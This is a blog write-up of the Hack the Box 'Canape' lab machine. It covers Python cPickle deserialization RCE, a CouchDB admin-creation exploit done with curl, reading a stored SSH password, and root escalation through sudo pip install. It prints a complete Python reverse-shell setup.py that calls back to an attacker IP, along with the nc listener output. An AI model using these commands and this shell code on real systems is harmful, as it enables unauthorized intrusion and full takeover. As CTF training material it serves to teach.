---
layout: post
title: "{Hack the Box} \\\\ Canape Write-Up"
date: 2018-09-15
image: http://fasetto.github.io/assets/images/htb-canape.png
author: fasetto
categories: [write-up, hackthebox]
tags: [writeup, pentest, hackthebox]
excerpt_separator: <!-- more-->
---

![repository-pattern.png]({{ site.baseurl }}/assets/images/htb-canape.png)
<br/>
# Hi everyone,

In this article I will be doing **Canape** machine on [Hack the Box](https://hackthebox.eu). <br>
Lets start..
<!-- more-->
# Enumeration
First we need to know which ports are open. So lets start with **port-knocking**

```
root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nmap -sS -sC -sV 10.10.10.70 -o scan-01.txt
Nmap scan report for 10.10.10.70
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
```
As you can see there is a git repo, probably contains source code of the app.
I wanna look at that web page first.

<br>
![canape-web-ui]({{ site.baseurl }}/assets/images/htb-canape-web-ui.png)

Hmm, **CouchDB** looks like interesting. At this point I examined all pages on this site. <br>
And decided to enumerate the directories on this site, so I ran **gobuster**, but didn’t find anything. Because if I go to the page which there isn’t on the site, the app gives me *200 ok* and shows me a weird random code. Must has a custom error handler.

So I decided to take a look at that git repo I found earlier.
Edited my `/etc/hosts` file to access the repo.

![etc-hosts-file]({{ site.baseurl }}/assets/images/pm2uaEznuvqG01Ths8xVfA.png)
<center><i>(By the way, <b>ozzy</b> is my docker container)</i></center>
<br>
```
root@89e502fff05a:~/pentest/hack-the-box/machines/canape# git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), done.
```

![image]({{ site.baseurl }}/assets/images/1_ffrnrj5K6rrKBJ1zRWPuyw.png)

There it is, **__init__.py**<br>
Other files are not important. Just some html and js files.<br>
Now we can examine the source code of the app. I’m using **Visual Studio Code** as my text editor.

![image]({{ site.baseurl }}/assets/images/1_TwPKjstuhGUrDey4xM4m-A.png)

**CouchDB** running on http://localhost:5984/ noted. Also there is a *custom error handler* I talked about it. <br>
But the important one is **cPickle**. Its a *built-in python module* that allows you to **serialize & deserialize** objects.

Here is the full gist of **__init__.py**<br>
https://git.io/fAiTB

{% gist fasetto/96797814faa9789a4787d3365a53a9da %}

Inside of the check function `item = cPickle.loads(data)` <br>

This line will help us to get **RCE (Remote Code Execution)**.
If we post something to http://canape.htb/submit with *character* and *quote* parameters that function will create a file in **/tmp** folder. And write our parameters in that file.

`outfile = write(char + quote)`<br>
And than if we post to http://canape.htb/check with parameter **id** that function will load our data.
If our data contains malicious code, also will be executed.<br>
Now we can build our **payload**. But first, character parameter must contain the one of items on the **whitelist**, don't forget that.
Otherwise we will get *500 Internet Server Error.*

# Exploitation
`WHITELIST = [ "homer", "marge", "bart", "lisa", "maggie", "moe", "carl", "krusty" ]`

![image]({{ site.baseurl }}/assets/images/1_GRvSoUS_zlAZdR8BjeMOog.png)

I wrote a simple script to test it if it works..<br>
So I added **"homer"** at the end of my payload. I added at the begining before but when I tried to execute my test script, it didn't worked.

Ran it and boooom, the command was executed.

![image]({{ site.baseurl }}/assets/images/1_UwIXKF_esjrWqgn9l3pmdw.png)

Than I build a little script to get a **reverse-shell.**<br>
Here is the gist link. https://git.io/fAiTU

![image]({{ site.baseurl }}/assets/images/1_mhbAJYSEztxNPp9GHNSGjA.png)

![image]({{ site.baseurl }}/assets/images/1_VNIJlcUPp8ld2XxSoPfODw.png)

Now we are in as www-data user. We can start to enumerate from the inside.<br>
But first lets quickly upgrade our shell.

>CTRL + Z<br>
>stty raw -echo<br>
>fg

# Further Enumeration
First I want it to check **couchdb**. I didn’t know how to query that database, so I searched on google.

```
www-data@canape:/$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/$ curl http://localhost:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}

www-data@canape:/$ curl http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]

www-data@canape:/$ curl http://localhost:5984/passwords
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

> Tip: You can **prettify** that values in **vscode** by pressing *CTRL + K F*<br>

Hmmm thats interesting. There is passwords table, probably with usefull content.<br>
I wanna check it out, but it gives me an error that says I’m not authorized.

At this point, I know the version of **couchdb**, so I searched for common exploits and vulnerabilities.
And I came across with these:

>https://www.exploit-db.com/exploits/44498/<br>
>https://serverfault.com/questions/742184/couchdb-user-creation-without-authentication-standard-behavior

```
www-data@canape:/$ curl -X PUT "http://localhost:5984/_users/org.couchdb.user:pwn" -d '{ "type": "user", "name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'
<"name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'
{"ok":true,"id":"org.couchdb.user:pwn","rev":"1-2189e39effa7061778a422d5e9318d21"}
```

Yea, that worked, we added an admin user with name and password pwn .

```
www-data@canape:/$ curl http://pwn:pwn@localhost:5984/_users/_all_docs
{"total_rows":3,"offset":0,"rows":[
{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
{"id":"org.couchdb.user:guest","key":"org.couchdb.user:guest","value":{"rev":"1-76778427e593a7e4a68832b308ed4a5e"}},
{"id":"org.couchdb.user:pwn","key":"org.couchdb.user:pwn","value":{"rev":"1-2189e39effa7061778a422d5e9318d21"}}
]}
```
Lets have a look at **passwords** database:

```
www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

At this point, I spent my time to understand that values. And I spent to much time to figure it out.<br>
Searched on google how to read those.

Than I understand, I didn’t know that base64 values are the actual **id** values like sql table id’s.

> Tip: http://docs.couchdb.org/en/stable/api/index.html

```
www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
```

We got a password.<br>
Lets cat the /etc/passwd for enumerating **users** on system.

```
...
homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
...
```

Maybe that password we found belongs to **homer ?**

```
www-data@canape:/$ su homer
Password:
homer@canape:/$
```

We got **homer** now. **user.txt** is in this home folder.

# Privilege Escalation
First lets check **sudo -l**

```
homer@canape:~$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

We can install **pip** packages as **root,** great.<br>
I can grab the flag easily, let me show you.

```
homer@canape:~/.root$ sudo pip install -r /root/root.txt
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Collecting xxxxxxxxxxxxxxxxxxxxxxx (from -r /root/root.txt (line 1))
```

Why it worked ? **-r** flag means take all requipments from given txt file. And I gave it **root.txt** :smiling_imp: <br>
Then pip want it to collect the first line and **boooom.** *(first-line was the flag)*

And this is other technique for **reverse-shell.** Create empty folder and name it this little script as **setup.py** and run `sudo pip install .`

```py
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.163",3141))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
```

```
homer@canape:~/.root$ sudo pip install .
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /home/homer/.root
```

Listening machine:

```
root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nc -lvnp 3141
listening on [any] 3141 ...
connect to [10.10.14.163] from (UNKNOWN) [10.10.10.70] 39504
# id
uid=0(root) gid=0(root) groups=0(root)
```

Done, now we are **root**.
It think it was an easy box, but getting the user is a bit hard. Because most of us didn’t knew about couchdb.<br>
I used pouchdb and couchdb together one of my projects but even I didn’t knew how to query it using http api ?!<br>
This box, pushes us to learn some.

See you guys later.

